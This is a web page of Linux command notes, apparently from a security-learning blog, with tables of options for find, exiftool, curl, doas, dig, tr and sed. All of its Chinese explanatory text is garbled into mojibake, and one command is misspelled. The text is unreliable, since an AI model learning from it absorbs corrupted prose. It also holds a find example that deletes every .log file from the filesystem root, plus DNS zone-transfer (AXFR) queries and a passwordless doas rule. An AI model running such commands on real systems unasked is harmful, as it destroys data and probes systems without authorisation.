<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>findä¸€ä¸ªæ–‡ä»¶ åé¢å¯ä»¥è·Ÿä¸Š -execæŒ‡å®šæ¯æ‰¾åˆ°ä¸€ä¸ªå°±æ‰§è¡Œçš„å‘½ä»¤ æ¯”å¦‚ -exec whami ;  åé¢è¦åŠ ä¸Šåæ–œæ å’Œå°å· å‘Šè¯‰findä¸ç”¨è§£æåé¢çš„å†…å®¹äº†ï¼ˆéœ€è¦åšçš„å‘½ä»¤å°±è¿™äº›ï¼‰</p>
<h3 id="å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹"><a href="#å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹" class="headerlink" title="å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹"></a>å¸¸ç”¨å‚æ•°å’Œç¤ºä¾‹</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-username</code></td>
<td>æŒ‡å®šç”¨æˆ·å</td>
<td><code>find /home -username user1</code></td>
</tr>
<tr>
<td><code>-group</code></td>
<td>æŒ‡å®šç»„</td>
<td><code>find /home -group admin</code></td>
</tr>
<tr>
<td><code>-type</code></td>
<td>æŒ‡å®šè¦æ‰¾çš„æ–‡ä»¶ç±»å‹</td>
<td><code>find / -type f</code>ï¼ˆæŸ¥æ‰¾æ™®é€šæ–‡ä»¶ï¼‰<br><code>find / -type d</code>ï¼ˆæŸ¥æ‰¾ç›®å½•ï¼‰</td>
</tr>
<tr>
<td><code>-name</code></td>
<td>æŒ‰æ–‡ä»¶åæŸ¥æ‰¾</td>
<td><code>find /home -name &quot;*.txt&quot;</code></td>
</tr>
<tr>
<td><code>-size</code></td>
<td>æŒ‰æ–‡ä»¶å¤§å°æŸ¥æ‰¾</td>
<td><code>find / -size +10M</code>ï¼ˆæŸ¥æ‰¾å¤§äº10MBçš„æ–‡ä»¶ï¼‰</td>
</tr>
<tr>
<td><code>-mtime</code></td>
<td>æŒ‰ä¿®æ”¹æ—¶é—´æŸ¥æ‰¾</td>
<td><code>find / -mtime -7</code>ï¼ˆæŸ¥æ‰¾æœ€è¿‘7å¤©å†…ä¿®æ”¹çš„æ–‡ä»¶ï¼‰</td>
</tr>
<tr>
<td><code>-exec</code></td>
<td>å¯¹æ‰¾åˆ°çš„æ–‡ä»¶æ‰§è¡Œå‘½ä»¤</td>
<td><code>find / -name &quot;*.log&quot; -exec rm &#123;&#125; \;</code></td>
</tr>
<tr>
<td><code>-perm</code></td>
<td>æŒ‰æƒé™æŸ¥æ‰¾</td>
<td><code>find / -perm 644</code></td>
</tr>
<tr>
<td><code>-user</code></td>
<td>æŒ‰æ–‡ä»¶æ‰€æœ‰è€…æŸ¥æ‰¾</td>
<td><code>find / -user user1</code></td>
</tr>
<tr>
<td><code>-maxdepth</code></td>
<td>è®¾ç½®æŸ¥æ‰¾çš„æœ€å¤§æ·±åº¦</td>
<td><code>find / -maxdepth 2</code></td>
</tr>
</tbody></table>
<h2 id="â€“break-system-packages"><a href="#â€“break-system-packages" class="headerlink" title="â€“break-system-packages"></a>â€“break-system-packages</h2><p>æ–°çš„kaliå’Œubuntuä¸­çš„pipæŒ‡ä»¤ç›´æ¥å®‰è£…ä¼šæŠ¥é”™ï¼Œpip3 install åé¢åŠ ä¸Šè¿™ä¸ªæŒ‡ä»¤æ‰èƒ½å®‰è£…ï¼ˆå¿½ç•¥é£é™©ï¼‰æ¨èä½¿ç”¨dockerå®‰è£…</p>
<h2 id="exiftool"><a href="#exiftool" class="headerlink" title="exiftool"></a>exiftool</h2><p><code>exiftool</code> æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºè¯»å–ã€ä¿®æ”¹å’Œåˆ é™¤æ–‡ä»¶çš„å…ƒæ•°æ®ï¼ˆmetadataï¼‰ã€‚å®ƒæ”¯æŒå¤šç§æ–‡ä»¶æ ¼å¼ï¼ŒåŒ…æ‹¬å›¾ç‰‡ã€è§†é¢‘ã€éŸ³é¢‘ã€PDF ç­‰ï¼Œå¸¸ç”¨äºå¤„ç† EXIFã€IPTCã€XMP ç­‰ç±»å‹çš„å…ƒä¿¡æ¯ã€‚</p>
<h3 id="å¸¸ç”¨å‚æ•°-5"><a href="#å¸¸ç”¨å‚æ•°-5" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-common</code></td>
<td>æ˜¾ç¤ºå¸¸è§çš„å…ƒæ•°æ®ä¿¡æ¯</td>
<td><code>exiftool -common image.jpg</code></td>
</tr>
<tr>
<td><code>-all</code></td>
<td>æ˜¾ç¤ºæ‰€æœ‰å…ƒæ•°æ®</td>
<td><code>exiftool -all image.jpg</code></td>
</tr>
<tr>
<td><code>-overwrite_original</code></td>
<td>ä¿®æ”¹æ–‡ä»¶æ—¶ä¸ç”Ÿæˆå¤‡ä»½</td>
<td><code>exiftool -overwrite_original -Artist=&quot;John Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-Author</code></td>
<td>è®¾ç½®ä½œè€…ä¿¡æ¯</td>
<td><code>exiftool -Author=&quot;John Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-DateTimeOriginal</code></td>
<td>ä¿®æ”¹æ‹æ‘„æ—¶é—´</td>
<td><code>exiftool -DateTimeOriginal=&quot;2024:01:30 12:00:00&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-GPSLatitude</code> &amp; <code>-GPSLongitude</code></td>
<td>è®¾ç½®GPSåæ ‡</td>
<td><code>exiftool -GPSLatitude=40.7128 -GPSLongitude=-74.0060 image.jpg</code></td>
</tr>
<tr>
<td><code>-r</code></td>
<td>é€’å½’å¤„ç†ç›®å½•</td>
<td><code>exiftool -r -all /path/to/images</code></td>
</tr>
<tr>
<td><code>-d</code></td>
<td>æ ¼å¼åŒ–æ—¶é—´è¾“å‡º</td>
<td><code>exiftool -d &quot;%Y-%m-%d %H:%M:%S&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-delete_original</code></td>
<td>åˆ é™¤å¤‡ä»½æ–‡ä»¶</td>
<td><code>exiftool -delete_original image.jpg</code></td>
</tr>
<tr>
<td><code>-tagsFromFile</code></td>
<td>ä»å¦ä¸€ä¸ªæ–‡ä»¶å¤åˆ¶å…ƒæ•°æ®</td>
<td><code>exiftool -tagsFromFile source.jpg target.jpg</code></td>
</tr>
<tr>
<td><code>-fast</code></td>
<td>åŠ å¿«å¤„ç†é€Ÿåº¦ï¼Œä½†å¯èƒ½ç•¥å¾®é™ä½å‡†ç¡®æ€§</td>
<td><code>exiftool -fast image.jpg</code></td>
</tr>
<tr>
<td><code>-b</code></td>
<td>ä»¥äºŒè¿›åˆ¶æ ¼å¼æå–æ•°æ®</td>
<td><code>exiftool -b -ThumbnailImage image.jpg &gt; thumb.jpg</code></td>
</tr>
<tr>
<td><code>-P</code></td>
<td>ä¿ç•™åŸå§‹æ–‡ä»¶ä¿®æ”¹æ—¶é—´</td>
<td><code>exiftool -P -Artist=&quot;Jane Doe&quot; image.jpg</code></td>
</tr>
<tr>
<td><code>-X</code></td>
<td>ä»¥XMLæ ¼å¼å¯¼å‡ºå…ƒæ•°æ®</td>
<td><code>exiftool -X image.jpg &gt; metadata.xml</code></td>
</tr>
<tr>
<td><code>-csv</code></td>
<td>ä»¥CSVæ ¼å¼å¯¼å‡ºå…ƒæ•°æ®</td>
<td><code>exiftool -csv image.jpg &gt; metadata.csv</code></td>
</tr>
</tbody></table>
<h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p><code>curl</code> æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºå‘æœåŠ¡å™¨å‘é€è¯·æ±‚å¹¶æ¥æ”¶å“åº”ã€‚å®ƒæ”¯æŒå¤šç§åè®®ï¼ˆå¦‚ HTTPã€HTTPSã€FTP ç­‰ï¼‰ï¼Œå¸¸ç”¨äºä¸‹è½½æ–‡ä»¶ã€æµ‹è¯•æ¥å£ã€æäº¤æ•°æ®ç­‰æ“ä½œã€‚</p>
<table>
<thead>
<tr>
<th>å‚æ•°</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td><code>-o</code></td>
<td>ä¿å­˜è¾“å‡ºåˆ°æŒ‡å®šæ–‡ä»¶</td>
<td><code>curl -o output.html https://example.com</code></td>
</tr>
<tr>
<td><code>-O</code></td>
<td>ä»¥è¿œç¨‹æ–‡ä»¶åä¿å­˜</td>
<td><code>curl -O https://example.com/file.zip</code></td>
</tr>
<tr>
<td><code>-L</code></td>
<td>è·Ÿéšé‡å®šå‘</td>
<td><code>curl -L https://example.com</code></td>
</tr>
<tr>
<td><code>-I</code></td>
<td>ä»…è·å– HTTP å¤´ä¿¡æ¯</td>
<td><code>curl -I https://example.com</code></td>
</tr>
<tr>
<td><code>-X</code></td>
<td>æŒ‡å®š HTTP æ–¹æ³•</td>
<td><code>curl -X POST https://example.com/api</code></td>
</tr>
<tr>
<td><code>-H</code></td>
<td>æ·»åŠ  HTTP å¤´</td>
<td><code>curl -H &quot;Authorization: Bearer TOKEN&quot; https://api.example.com</code></td>
</tr>
<tr>
<td><code>-d</code></td>
<td>å‘é€ POST æ•°æ®</td>
<td><code>curl -d &quot;name=John&amp;age=30&quot; -X POST https://example.com/form</code></td>
</tr>
<tr>
<td><code>-F</code></td>
<td>ä¸Šä¼ æ–‡ä»¶</td>
<td><code>curl -F &quot;file=@image.jpg&quot; https://example.com/upload</code></td>
</tr>
<tr>
<td><code>-u</code></td>
<td>è®¤è¯ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰</td>
<td><code>curl -u user:pass https://example.com/login</code></td>
</tr>
<tr>
<td><code>-k</code></td>
<td>è·³è¿‡ SSL è¯ä¹¦éªŒè¯</td>
<td><code>curl -k https://self-signed.example.com</code></td>
</tr>
</tbody></table>
<p>-X æŒ‡å®šè®¿é—®æ–¹å¼ POST GET PUT<br>â€“data æŒ‡å®šå…·ä½“å‚æ•°</p>
<h2 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h2><p>å®ƒæ—¨åœ¨æä¾›ç®€æ´çš„å‘½ä»¤è¡ŒæŒ‡ä»¤ä½¿ç”¨ç¤ºä¾‹å’Œè¯´æ˜ï¼Œå¸®åŠ©ç”¨æˆ·å¿«é€Ÿäº†è§£å‘½ä»¤çš„åŸºæœ¬ç”¨æ³•ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">tldr</span><span class="meta"> [å‘½ä»¤åç§°]</span></span><br></pre></td></tr></table></figure></div>

<h2 id="gocr"><a href="#gocr" class="headerlink" title="gocr"></a>gocr</h2><p><code>gocr</code>Â æ˜¯ä¸€ä¸ªåœ¨ Linux ç­‰ç³»ç»Ÿä¸­ç”¨äºå…‰å­¦å­—ç¬¦è¯†åˆ«ï¼ˆOCRï¼‰çš„å·¥å…·ï¼Œå®ƒå¯ä»¥å°†å›¾åƒä¸­çš„æ–‡å­—æå–å¹¶è½¬æ¢ä¸ºå¯ç¼–è¾‘çš„æ–‡æœ¬æ ¼å¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARDUINO"><figure class="iseeu highlight /arduino"><table><tr><td class="code"><pre><span class="line">gocr image.jpg</span><br></pre></td></tr></table></figure></div>

<h2 id="doas"><a href="#doas" class="headerlink" title="doas"></a>doas</h2><p><code>doas</code>æ˜¯ä¸€ä¸ªç”¨äºåœ¨ç±» Unix ç³»ç»Ÿä¸­ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½ï¼ˆé€šå¸¸æ˜¯è¶…çº§ç”¨æˆ·<code>root</code>ï¼‰æ‰§è¡Œå‘½ä»¤çš„å·¥å…·ï¼Œç±»ä¼¼äº<code>su</code>å’Œ<code>sudo</code>ã€‚ä»¥ä¸‹æ˜¯å…³äº<code>doas</code>çš„åŸºæœ¬ä¿¡æ¯å’Œå¸¸ç”¨å‚æ•°ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DIFF"><figure class="iseeu highlight /diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-nï¼šä¸è¯¢é—®å¯†ç æ‰§è¡Œå‘½ä»¤ã€‚ä½†è¿™éœ€è¦åœ¨Â doasÂ çš„é…ç½®æ–‡ä»¶ä¸­è¿›è¡Œç›¸åº”è®¾ç½®ï¼Œå…è®¸ç‰¹å®šç”¨æˆ·æˆ–ç”¨æˆ·ç»„åœ¨ä¸è¾“å…¥å¯†ç çš„æƒ…å†µä¸‹æ‰§è¡ŒæŸäº›å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œåœ¨é…ç½®å…è®¸çš„æƒ…å†µä¸‹ï¼Œdoas -n some_commandÂ å¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤è€Œæ— éœ€è¾“å…¥å¯†ç ã€‚</span></span><br><span class="line"><span class="deletion">-vï¼šæ˜¾ç¤ºÂ doasÂ çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</span></span><br></pre></td></tr></table></figure></div>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-4"><a href="#ä½¿ç”¨ç¤ºä¾‹-4" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»¥ root èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼ˆç±»ä¼¼ sudoï¼‰</span></span><br><span class="line">doas <span class="keyword">ls</span> <span class="string">/root</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»¥ç‰¹å®šç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">doas -u user <span class="keyword">ls</span> <span class="string">/home/user</span></span><br><span class="line"><span class="params">------------------------------</span></span><br><span class="line">ï¼ˆä¸‹é¢æ˜¯é…ç½®æ–‡ä»¶ä¸­çš„å†…å®¹ï¼‰</span><br><span class="line"><span class="comment"># å…è®¸ç”¨æˆ·æ‰§è¡Œæ‰€æœ‰å‘½ä»¤ï¼ˆ/etc/doas.confï¼‰</span></span><br><span class="line">permit username</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…è®¸ç”¨æˆ·ä»¥ root èº«ä»½æ‰§è¡ŒæŒ‡å®šå‘½ä»¤</span></span><br><span class="line">permit username as root cmd <span class="string">/sbin/shutdown</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…è®¸ç”¨æˆ·æ— éœ€å¯†ç æ‰§è¡ŒæŸäº›å‘½ä»¤</span></span><br><span class="line">permit nopass username as root cmd <span class="string">/sbin/reboot</span></span><br></pre></td></tr></table></figure>

<h2 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h2><p><code>dig</code>ï¼ˆDomain Information Groperï¼‰æ˜¯ä¸€ä¸ªç”¨äºæŸ¥è¯¢ DNSï¼ˆDomain Name Systemï¼‰ä¿¡æ¯çš„å¼ºå¤§å·¥å…·ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­éå¸¸å¸¸ç”¨</p>
<p>åœ¨ dig å‘½ä»¤ä¸­ï¼ŒAXFR æ˜¯ä¸€ç§æŸ¥è¯¢ç±»å‹ï¼Œç”¨äºè¯·æ±‚ DNS åŒºåŸŸä¼ è¾“ï¼ˆ Authoritative Xerox File Replicationï¼‰ã€‚å®ƒç”¨äºä»ä¸» DNS æœåŠ¡å™¨è·å–æ•´ä¸ª DNS åŒºåŸŸçš„æ‰€æœ‰è®°å½•ï¼Œé€šå¸¸ç”¨äºå¤‡ä»½ DNS è®°å½•æˆ–åœ¨ä¸» &#x2F; è¾…åŠ© DNS æœåŠ¡å™¨ä¹‹é—´åŒæ­¥æ•°æ®ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">dig @<span class="tag">&lt;<span class="name">DNSæœåŠ¡å™¨</span>&gt;</span> <span class="tag">&lt;<span class="name">åŸŸå</span>&gt;</span> AXFR</span><br></pre></td></tr></table></figure></div>

<h3 id="ä½¿ç”¨ç¤ºä¾‹-5"><a href="#ä½¿ç”¨ç¤ºä¾‹-5" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¯¢åŸŸåçš„ A è®°å½•</span></span><br><span class="line"><span class="keyword">dig </span>example.com A</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢åŸŸåçš„ MX è®°å½•ï¼ˆé‚®ä»¶æœåŠ¡å™¨ï¼‰</span></span><br><span class="line"><span class="keyword">dig </span>example.com MX</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½¿ç”¨æŒ‡å®šçš„ DNS æœåŠ¡å™¨ï¼ˆå¦‚ 8.8.8.8ï¼‰è¿›è¡ŒæŸ¥è¯¢</span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–ç®€çŸ­çš„æŸ¥è¯¢ç»“æœ</span></span><br><span class="line"><span class="keyword">dig </span>example.com +<span class="keyword">short</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="comment"># è¿½è¸ª DNS è§£æè¿‡ç¨‹</span></span><br><span class="line"><span class="keyword">dig </span>example.com +trace</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä»æŒ‡å®šdnsæœåŠ¡å™¨ä¸ŠæŸ¥è¯¢ï¼Œç”¨@ç¬¦å· </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#-x </span></span><br><span class="line"><span class="keyword">dig </span>@<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span>.<span class="number">8</span> abc.filterinto.com</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç²¾ç®€è¾“å‡º +short</span></span><br><span class="line"> <span class="keyword">dig </span>+<span class="keyword">short </span>abc.filterinto.com</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="resolv-conf"><a href="#resolv-conf" class="headerlink" title="resolv.conf"></a>resolv.conf</h2><p><code>resolv.conf</code>Â æ˜¯ä¸€ä¸ªåœ¨ç±» Unix ç³»ç»Ÿï¼ˆå¦‚ Linuxã€Unixã€macOS ç­‰ï¼‰ä¸­éå¸¸é‡è¦çš„é…ç½®æ–‡ä»¶ï¼Œå®ƒä¸»è¦ç”¨äºé…ç½®ç³»ç»Ÿçš„ DNSï¼ˆåŸŸåç³»ç»Ÿï¼‰è§£æç›¸å…³ä¿¡æ¯ã€‚</p>
<ul>
<li>åœ¨å¤§å¤šæ•° Linux ç³»ç»Ÿä¸­ï¼Œ<code>resolv.conf</code>Â é€šå¸¸ä½äºÂ <code>/etc/resolv.conf</code>ã€‚</li>
</ul>
<h2 id="etc-bind"><a href="#etc-bind" class="headerlink" title="&#x2F;etc&#x2F;bind"></a>&#x2F;etc&#x2F;bind</h2><p><code>/etc/bind</code>Â æ˜¯åœ¨ BINDï¼ˆBerkeley Internet Name Domainï¼‰DNS æœåŠ¡å™¨è½¯ä»¶çš„å¸¸è§é…ç½®ç›®å½•ã€‚BIND æ˜¯ä¸€ä¸ªå¹¿æ³›ä½¿ç”¨çš„å¼€æº DNS æœåŠ¡å™¨è½¯ä»¶ï¼Œç”¨äºå®ç°åŸŸåè§£ææœåŠ¡ã€‚</p>
<h2 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h2><p><code>tr</code>Â å‘½ä»¤ä¸»è¦ç”¨äºå­—ç¬¦çš„æ›¿æ¢ã€åˆ é™¤å’Œå‹ç¼©ï¼Œå®ƒä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ï¼Œå¹¶å°†å¤„ç†ç»“æœè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">tr</span> <span class="selector-attr">[é€‰é¡¹]</span> SET1 <span class="selector-attr">[SET2]</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>-c</code>ï¼šä½¿ç”¨Â <code>SET1</code>Â çš„è¡¥é›†ã€‚å³æ“ä½œé™¤Â <code>SET1</code>Â ä¸­å­—ç¬¦ä»¥å¤–çš„æ‰€æœ‰å­—ç¬¦ã€‚</li>
<li><code>-d</code>ï¼šåˆ é™¤Â <code>SET1</code>Â ä¸­çš„å­—ç¬¦ï¼Œè€Œä¸æ˜¯æ›¿æ¢å®ƒä»¬ã€‚</li>
<li><code>-s</code>ï¼šå°†è¿ç»­é‡å¤çš„å­—ç¬¦å‹ç¼©ä¸ºä¸€ä¸ªå­—ç¬¦ã€‚</li>
</ul>
<p>é€šå¸¸åªèƒ½ç”¨æ¥å•ä¸ªå­—ç¬¦</p>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-6"><a href="#ä½¿ç”¨ç¤ºä¾‹-6" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># å°†å°å†™å­—æ¯è½¬æ¢ä¸ºå¤§å†™</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | <span class="built_in">tr</span> <span class="string">&#x27;a-z&#x27;</span> <span class="string">&#x27;A-Z&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: HELLO WORLD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤æ•°å­—</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;abc123xyz&quot;</span> | <span class="built_in">tr</span> -d <span class="string">&#x27;0-9&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: abcxyz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‹ç¼©è¿ç»­çš„ç©ºæ ¼ä¸ºå•ä¸ªç©ºæ ¼</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello     world&quot;</span> | <span class="built_in">tr</span> -s <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: hello world</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åªä¿ç•™å­—æ¯ï¼Œåˆ é™¤æ‰€æœ‰éå­—æ¯å­—ç¬¦</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;a1b2c3d4&quot;</span> | <span class="built_in">tr</span> -<span class="built_in">cd</span> <span class="string">&#x27;a-zA-Z&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: abcd</span></span><br></pre></td></tr></table></figure></div>

<h2 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h2><p><code>sed</code>ï¼ˆStream Editorï¼‰æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æµç¼–è¾‘å™¨ï¼Œå®ƒå¯ä»¥å¯¹æ–‡æœ¬æµè¿›è¡Œå„ç§æ“ä½œï¼ŒåŒ…æ‹¬æŸ¥æ‰¾ã€æ›¿æ¢ã€åˆ é™¤ã€æ’å…¥ç­‰ã€‚<code>sed</code>Â ä¸»è¦ç”¨äºå¯¹æ–‡ä»¶æˆ–æ ‡å‡†è¾“å…¥è¿›è¡Œé€è¡Œå¤„ç†ï¼Œå¹¶å°†å¤„ç†ç»“æœè¾“å‡ºã€‚</p>
<ul>
<li><code>s/æ¨¡å¼/æ›¿æ¢å†…å®¹/g</code>ï¼šè¿™æ˜¯æœ€å¸¸ç”¨çš„å‘½ä»¤ï¼Œç”¨äºè¿›è¡Œå­—ç¬¦ä¸²æ›¿æ¢ã€‚<ul>
<li><code>s</code>Â è¡¨ç¤ºæ›¿æ¢æ“ä½œã€‚</li>
<li><code>æ¨¡å¼</code>Â æ˜¯è¦æŸ¥æ‰¾å’Œæ›¿æ¢çš„å†…å®¹ã€‚</li>
<li><code>æ›¿æ¢å†…å®¹</code>Â æ˜¯æ›¿æ¢åçš„å†…å®¹ã€‚</li>
<li><code>g</code>Â è¡¨ç¤ºå…¨å±€æ›¿æ¢ï¼Œå³å¯¹æ¯ä¸€è¡Œä¸­å‡ºç°çš„æ‰€æœ‰åŒ¹é…æ¨¡å¼è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœä¸ä½¿ç”¨Â <code>g</code>ï¼Œåˆ™åªæ›¿æ¢æ¯è¡Œä¸­çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ã€‚</li>
</ul>
</li>
<li><code>d</code>ï¼šåˆ é™¤åŒ¹é…æ¨¡å¼çš„è¡Œã€‚</li>
<li><code>p</code>ï¼šæ‰“å°åŒ¹é…æ¨¡å¼çš„è¡Œã€‚</li>
</ul>
<h3 id="ä½¿ç”¨ç¤ºä¾‹-7"><a href="#ä½¿ç”¨ç¤ºä¾‹-7" class="headerlink" title="ä½¿ç”¨ç¤ºä¾‹"></a>ä½¿ç”¨ç¤ºä¾‹</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ›¿æ¢å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;hello world&quot;</span> | sed <span class="string">&#x27;s/world/universe/&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: hello universe</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¨å±€æ›¿æ¢</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;apple banana apple&quot;</span> | sed <span class="string">&#x27;s/apple/orange/g&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º: orange banana orange</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ é™¤åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²çš„è¡Œ</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;line1\nline2\nline3&quot;</span> | sed <span class="string">&#x27;/line2/d&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º:</span></span><br><span class="line"><span class="comment"># line1</span></span><br><span class="line"><span class="comment"># line3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰“å°åŒ¹é…è¡Œ</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;foo\nbar\nbaz&quot;</span> | sed -n <span class="string">&#x27;/ba/p&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º:</span></span><br><span class="line"><span class="comment"># bar</span></span><br><span class="line"><span class="comment"># baz</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»…æ›¿æ¢ç¬¬ä¸€è¡ŒåŒ¹é…é¡¹</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;apple\napple\napple&quot;</span> | sed <span class="string">&#x27;1s/apple/orange/&#x27;</span></span><br><span class="line"><span class="comment"># è¾“å‡º:</span></span><br><span class="line"><span class="comment"># orange</span></span><br><span class="line"><span class="comment"># apple</span></span><br><span class="line"><span class="comment"># apple</span></span><br></pre></td></tr></table></figure></div>
<h2 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h2><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œ<code>alias</code> æ˜¯ä¸€ä¸ªç”¨äºåˆ›å»ºå‘½ä»¤å¿«æ·æ–¹å¼çš„åŠŸèƒ½ã€‚é€šè¿‡ <code>alias</code>ï¼Œä½ å¯ä»¥å°†å¤æ‚æˆ–å¸¸ç”¨çš„å‘½ä»¤å®šä¹‰ä¸ºç®€çŸ­çš„åç§°ï¼Œä»è€Œæé«˜æ•ˆç‡å¹¶å‡å°‘é‡å¤è¾“å…¥ã€‚</p>
